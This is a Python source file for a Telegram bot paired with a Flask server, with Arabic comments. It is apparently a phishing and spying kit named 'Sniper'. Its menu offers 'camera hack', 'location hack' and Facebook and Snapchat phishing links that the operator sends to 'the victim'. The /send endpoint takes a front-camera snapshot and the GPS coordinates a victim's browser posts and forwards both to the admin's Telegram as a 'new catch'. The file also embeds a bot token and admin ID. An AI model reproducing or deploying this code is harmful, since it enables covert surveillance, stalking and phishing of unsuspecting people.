import os
import telebot
from flask import Flask, render_template, request, jsonify
import threading
import base64

# --- [ إعدادات القناص الأساسية ] ---
# التوكن والأيدي الخاص بك مدمجين وجاهزين
API_TOKEN = '8281242369:AAEf0c8gx9bhpbHqbXO5a0He-HlvTx_7Kp8'
ADMIN_ID = '8276213504'
# رابط السيرفر الخاص بك على ريندر
MY_URL = 'https://my-bot-sniper-1-2.onrender.com/insta'

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# --- [ 1. لوحة تحكم التليجرام (الأزرار الخضراء) ] ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    # قائمة الأزرار كما في الصورة التي أرسلتها
    buttons = [
        telebot.types.InlineKeyboardButton("📸 اختراق كاميرا", url=MY_URL),
        telebot.types.InlineKeyboardButton("📍 اختراق الموقع", url=MY_URL),
        telebot.types.InlineKeyboardButton("📘 اندكس فيسبوك", url=MY_URL),
        telebot.types.InlineKeyboardButton("👻 اندكس سناب شات", url=MY_URL),
        telebot.types.InlineKeyboardButton("🧠 لعبة الأذكياء", url=MY_URL),
        telebot.types.InlineKeyboardButton("📞 كاشف الأرقام", url=MY_URL),
        telebot.types.InlineKeyboardButton("🛡️ حماية الحساب", url=MY_URL),
        telebot.types.InlineKeyboardButton("👨‍💻 تواصل مع المطور", url="https://t.me/MQtry1")
    ]
    
    markup.add(*buttons)
    
    welcome_msg = (
        "🎯 **مرحباً بك في نظام القناص المطور v4.0**\n\n"
        "إليك قائمة الأدوات المتاحة حالياً. اختر الأداة التي تريد إرسالها للضحية لبدء عملية الصيد:"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode='Markdown')

# --- [ 2. سيرفر الويب (Flask) ] ---
@app.route('/')
@app.route('/insta')
def index():
    # يبحث الفلاسك عن ملف index.html داخل مجلد templates
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def receive_data():
    try:
        data = request.json
        img_data = data.get('image')
        lat = data.get('lat')
        lon = data.get('lon')

        # إرسال إشعار فوري بالموقع
        location_link = f"https://www.google.com/maps?q={lat},{lon}"
        bot.send_message(ADMIN_ID, f"🎯 **صيد جديد يا قائد!**\n📍 الموقع على الخريطة:\n{location_link}")

        # معالجة وإرسال الصورة
        if img_data and "," in img_data:
            header, encoded = img_data.split(",", 1)
            with open("victim_snap.png", "wb") as f:
                f.write(base64.b64decode(encoded))
            
            with open("victim_snap.png", "rb") as photo:
                bot.send_photo(ADMIN_ID, photo, caption="📸 صورة الضحية من الكاميرا الأمامية")
            
            os.remove("victim_snap.png") # تنظيف الملفات
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

# --- [ 3. تشغيل النظام (الخيوط المتوازية) ] ---
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # تشغيل بوت التليجرام في الخلفية
    threading.Thread(target=run_bot, daemon=True).start()
    
    # تشغيل السيرفر على المنفذ المطلوب لـ Render (لحل خطأ 502)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
